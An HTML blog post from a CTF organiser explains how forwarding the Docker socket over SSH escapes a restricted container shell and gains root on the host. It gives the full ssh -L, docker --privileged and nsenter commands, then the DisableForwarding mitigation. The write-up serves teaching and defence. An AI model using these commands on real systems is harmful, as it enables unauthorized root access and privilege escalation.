@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> 16 SSH Forwarding Quirks &middot; Viktor Barzin (Viktor Barzin&#39;s Website) </title>
+
+		<meta property='og:title' content="16 SSH Forwarding Quirks"/>
+<meta property="og:image" content="https://viktorbarzin.me/images/16-ssh-forwarding-quirks-0-18-47-23-resized.png" />
+<meta property="og:description" content="Abusing SSH forwarding features and common docker config allows for privilege escalation and secure shell escape onto the docker host." />
+<meta property='og:url' content="https://viktorbarzin.me/blog/16-ssh-forwarding-quirks/" />
+<meta property='og:type' content="website" />
+<meta property="og:site_name" content="Viktor Barzin (Viktor Barzin&#39;s Website And Personal Blog)" />
+<meta name="description" content="Abusing SSH forwarding features and common docker config allows for privilege escalation and secure shell escape onto the docker host." />
+
+<meta name="twitter:title" content="16 SSH Forwarding Quirks" />
+<meta name="twitter:description" content="Abusing SSH forwarding features and common docker config allows for privilege escalation and secure shell escape onto the docker host." />
+<meta name="twitter:image" content="https://viktorbarzin.me/images/16-ssh-forwarding-quirks-0-18-47-23-resized.png" />
+<meta name="twitter:site" content="@viktorbarzin" />
+<meta name="twitter:creator" content="@viktorbarzin" />
+
+<script type="application/ld+json">
+{
+    "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/viktorbarzin.me\/"
+    },
+    "articleSection" : "blog",
+    "name" : "16 SSH Forwarding Quirks",
+    "headline" : "16 SSH Forwarding Quirks",
+    "description" : "Abusing SSH forwarding features and common docker config allows for privilege escalation and secure shell escape onto the docker host.",
+    "inLanguage" : "en-US",
+    "author" : {
+        "@type": "Person",
+        "name": "Viktor Barzin",
+        "image": "",
+        "url": "https://viktorbarzin.me/",
+        "description": "I've been digging into Programming for quite some time now. My passion for technology has grown into cyber security and automation. I love ot go offline, watch Formula 1, play cheess and go skiing."
+    },
+    "creator" : "Viktor Barzin",
+    "publisher": {
+        "@context": "http://schema.org",
+        "@type": "Organization",
+        "name": "Viktor Barzin",
+        "sameAs": [
+            "https://www.facebook.com/viktor.barzin",
+            "https://github.com/ViktorBarzin",
+            "https://twitter.com/ViktorBarzin",
+            "https://www.linkedin.com/in/viktor-barzin/"
+        ],
+        "url": "https://viktorbarzin.me",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://viktorbarzin.me/images/profile-picture.jpeg"
+        }
+    },
+    "accountablePerson" : "Viktor Barzin",
+    "copyrightHolder" : "Viktor Barzin",
+    "copyrightYear" : "23038",
+    "datePublished": "2020-03-23T10:19:06Z",
+    "dateModified" : "2020-03-23T10:19:06Z",
+    "url" : "https:\/\/viktorbarzin.me\/blog\/16-ssh-forwarding-quirks\/",
+    "wordCount" : "952",
+    "image": 	"https:\/\/viktorbarzin.me\/images\/16-ssh-forwarding-quirks-0-18-47-23-resized.png",
+    "keywords" : [ "ssh","docker","privilege escalation","shell escape","unix domain socket","forwarding","ctf","attack-defense","nsenter","disable forwarding","docker privilege escalation","Blog" ]
+}
+</script>
+
+<script src="//instant.page/1.2.2" type="module" integrity="sha384-2xV8M5griQmzyiY3CDqh1dn4z3llDVqZDqzjzcY+jCBCk/a5fXJmuZ/40JJAPeoU"></script>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+
+
+
+
+<script src="/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://viktorbarzin.me/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-132992428-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-132992428-1');
+</script>
+
+
+
+
+
+
+        
+        <script nonce="2726c7f26v" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        <script nonce="2726c7f26v">
+            (adsbygoogle = window.adsbygoogle || []).push({
+                google_ad_client: "ca-pub-9755293925267478",
+                enable_page_level_ads: true
+            });
+        </script>
+
+    </head>
+
+    <body>
+        <header>
+  <nav
+    class="navbar navbar-default navbar-fixed-top navbar-inverse font-header"
+  >
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button
+          type="button"
+          class="navbar-toggle collapsed"
+          data-toggle="collapse"
+          data-target="#navbar-collapse-1"
+          aria-expanded="false"
+        >
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" id="green-terminal" href="https://viktorbarzin.me/"
+          >viktor@web ~
+          $</a
+        >
+      </div>
+
+      
+      <div class="collapse navbar-collapse" id="navbar-collapse-1">
+        <ul class="nav navbar-nav navbar-right">
+          <li>
+            <a href="https://viktorbarzin.me/"
+              >/home/viktor</a
+            >
+          </li>
+           
+          <li class="dropdown">
+            
+            <a href="/blog/">~/blog</a>
+            
+          </li>
+           
+          <li class="dropdown">
+            
+            <a href="/projects/">~/projects</a>
+            
+          </li>
+           
+          <li class="dropdown">
+            
+            <a href="/about-me/">~/about-me</a>
+            
+          </li>
+          
+        </ul>
+      </div>
+      
+    </div>
+    
+  </nav>
+
+  
+  
+  
+
+  </header>
+
+        <div class="container wrapper">
+            <h1><a href="https://viktorbarzin.me/blog/16-ssh-forwarding-quirks/">16 SSH Forwarding Quirks</a></h1>
+            <span class="post-date">Mar 23, 2020 </span>
+            <div class="post-content">
+                <h1 id="introduction">Introduction</h1>
+<p><a href="https://www.ssh.com/ssh">SSH</a> is a ubiquitous protocol for managing remote machines securely.</p>
+<p>Most of the time one would need just shell access to a remote machine to run commands, however, SSH allows for so much more.
+One of the interesting features is <strong>SSH forwarding</strong> - you can forward ports, unix sockets, X11 sessions and other interesting stuff.</p>
+<p>All of this is fine until you start sharing the ssh server host with other people.
+Recently, me and a few other people were organizing an attack-defense style Capture the Flag (CTF) event for my university&rsquo;s cyber security society (<a href="https://www.sucss.org/">SUCSS</a>).
+This blog post will be about a neat trick you can do with SSH forwarding to <strong>escalate privileges</strong> and <strong>escape a restricted shell</strong> environment and gain <strong>root access on the host</strong>.</p>
+<h1 id="overview-of-the-environment">Overview of the environment</h1>
+<p>The environment comprised a single Ubuntu virtual machine (VM) which hosts the entire CTF.
+Each team has a user to SSH into this VM and upon successful login is dropped into a docker container.
+All of these containers are in the same docker network and can attack each other.</p>
+<p>Essentially, this is the environment:</p>
+<div style="max-width: 500px; max-height:500px">
+<p><img src="/images/16-ssh-forwarding-quirks-0-18-47-23.png" alt=""></p>
+</div>
+<br>
+This is how the user shell looks like:
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#cd2828;font-weight:bold">#!/bin/bash
+</span><span style="color:#cd2828;font-weight:bold"></span>
+<span style="color:#40ffff">name</span>=<span style="color:#ed9d13">&#34;</span><span style="color:#40ffff">$USER</span><span style="color:#ed9d13">&#34;</span>_group
+docker run -d -it --rm --pids-limit=<span style="color:#3677a9">50</span> --cpus=<span style="color:#ed9d13">&#34;0.5&#34;</span> -m=<span style="color:#ed9d13">&#34;500m&#34;</span> --device-write-bps /dev/sda:1mb --name <span style="color:#40ffff">$name</span> sucss-group-ctf sudo -u <span style="color:#40ffff">$USER</span> /bin/bash 2&gt;/dev/null
+
+docker <span style="color:#24909d">exec</span> -it -u <span style="color:#40ffff">$USER</span> <span style="color:#40ffff">$name</span> /bin/bash
+</code></pre></div><p>This shell runs a container for the team and drops them into a shell on the container.</p>
+<h1 id="abusing-ssh-forwarding">Abusing SSH forwarding</h1>
+<p>Now, the above shell looks secure enough and does not let the user at any point to run any commands on the host.</p>
+<p>Secure, right?</p>
+<p>Well, not quite.</p>
+<p>As I mentioned earlier, SSH is quite a powerful protocols and can forward a lot of stuff including unix domain sockets.
+The docker CLI, by default, uses <a href="https://stackoverflow.com/questions/35110146/can-anyone-explain-docker-sock#answer-35110344">a unix domain socket</a> to communicate with the docker API.
+This essentially means that all the <code>docker ps</code>, <code>docker run</code>, <code>docker network ls</code> etc. commands <strong>all</strong> go through that socket.</p>
+<p>I reckon you already see the arising issue there - you could SSH into the host and forward the docker socket <strong>from the host</strong> locally and then escape on the host.</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh -L <span style="color:#40ffff">$PWD</span>/docker.sock:/var/run/docker.sock &lt;host&gt;
+</code></pre></div><p>(Forwarding unix sockets requires SSH &gt;=6.7 which you should be running)</p>
+<p>Now if we run <code>docker</code> using the forwarded socket we will communicate with the remote docker daemon:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ docker -H unix://docker.sock ps
+</code></pre></div><h1 id="popping-a-shell">Popping a shell</h1>
+<p>Using docker access to get a shell on the host is now trivial.
+We need to spawn a privileged container and mount the host rootfs inside.
+We can do so using:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run --privileged --pid=host -it alpine sh
+</code></pre></div><ul>
+<li>&ndash;privileged : grants additional permissions to the container, it allows the container to gain access to and mount the devices of the host (/dev)</li>
+<li>&ndash;pid=host : allows the containers to use the processus tree of the Docker host (the VM in which the Docker daemon is running)</li>
+</ul>
+<p>The easiest way to spawn a shell using the host rootfs is using the <code>nsenter</code> command:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nsenter -t <span style="color:#3677a9">1</span> -m -u -n -i sh
+</code></pre></div><p>From the help page:</p>
+<pre><code>BusyBox v1.31.1 () multi-call binary.
+
+Usage: nsenter [OPTIONS]PROG [ARGS]]
+
+         -t PID          Target process to get namespaces from
+         -m[FILE]        Enter mount namespace
+         -u[FILE]        Enter UTS namespace (hostname etc)
+         -i[FILE]        Enter System V IPC namespace
+         -n[FILE]        Enter network namespace
+         -p[FILE]        Enter pid namespace
+         -U[FILE]        Enter user namespace
+         -S UID          Set uid in entered namespace
+         -G GID          Set gid in entered namespace
+         --preserve-credentials  Don't touch uids or gids
+         -r[DIR]         Set root directory
+         -w[DIR]         Set working directory
+         -F              Don't fork before exec'ing PROG
+</code></pre><h1 id="tldr">tl;dr</h1>
+<p>To get a shell abusing the SSH forwarding capabilities and the docker daemon do:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh -L <span style="color:#40ffff">$PWD</span>/docker.sock:/var/run/docker.sock &lt;host&gt;
+</code></pre></div><p>in one shell and in another</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ docker -H unix://docker.sock run --privileged --pid=host -it alpine nsenter -t <span style="color:#3677a9">1</span> -m -u -n -i sh
+</code></pre></div><p>Voala!</p>
+<h1 id="mitigation">Mitigation</h1>
+<p>This is possible because of 2 things:</p>
+<ul>
+<li>Default sshd config allows forwarding</li>
+<li>Adding the user to the <code>docker</code> group</li>
+</ul>
+<p>The second is often done to let people run <code>$ docker ...</code> as opposed to <code>$ sudo docker ...</code>.
+For this environment it&rsquo;s needed because each user needs to start a container and drop the user inside.
+The process needs to be automatic and unattended so <code>sudo</code> must be passwordless but that&rsquo;s a hassle to setup per user.
+Thus adding the user to the <code>docker</code> group is the easiest thing to do.</p>
+<p>You can think of the above 2 conditions as prerequisites for this vulnerability to exist.
+If you fix any of them you would mitigate this issue.</p>
+<p>The change you need to make in <code>/etc/ssh/sshd_config</code> is adding</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xorg.conf" data-lang="xorg.conf">DisableForwarding<span style="color:#666"> </span><span style="color:#ed9d13">yes</span><span style="color:#666">
+</span></code></pre></div><p>This disables all forwarding features and I strongly recommend having it in there as a secure default and enable it on per-user basis when needed.</p>
+<p>Once you have this in your ssh config, trying the same trick again yields these errors:</p>
+<p>In the SSH shell:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">user@host:~$ channel 2: open failed: connect failed: open failed
+channel 2: open failed: connect failed: open failed
+channel 2: open failed: connect failed: open failed
+</code></pre></div><p>And when you run</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─$ docker -H unix://docker.sock run --privileged --pid=host -it alpine nsenter -t <span style="color:#3677a9">1</span> -m -u -n -i sh
+docker: error during connect: Post http://docker.sock/v1.40/containers/create: <span style="color:#24909d">read</span> unix @-&gt;/home/viktor/docker.sock: read: connection reset by peer.
+See <span style="color:#ed9d13">&#39;docker run --help&#39;</span>.
+</code></pre></div><h1 id="conclusion">Conclusion</h1>
+<p>This little neat trick exploits the powers of SSH forwarding as well as the privileges docker gives a user.
+<strong>Effectively if a user can spawn docker containers, they have root on that machine</strong> which is scary when you think about it.</p>
+<p>Shout out to <a href="https://timstallard.me.uk/">Tim Stallard</a> for pointing this trick.
+Here are a couple of articles on <a href="https://medium.com/@dperny/forwarding-the-docker-socket-over-ssh-e6567cfab160">how to forward the docker socket over ssh</a> and <a href="https://medium.com/lucjuggery/a-container-to-access-the-shell-of-the-host-2c7c227c64e9">how to get a shell on the host from a container</a>.</p>
+<p>Thanks for reading!</p>
+
+            </div>
+            
+            <div class="post-comments">
+                <div id="disqus_thread"></div>
+
+<script nonce="2726c7f26v" type="application/javascript">
+    var disqus_config = function () {
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "viktorbarzin" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>Copyright &copy; 2020 Viktor Barzin
+<span class="credit">
+	
+	
+	
+	
+    
+</span>
+</p>
+</footer>
+
+
+    </body>
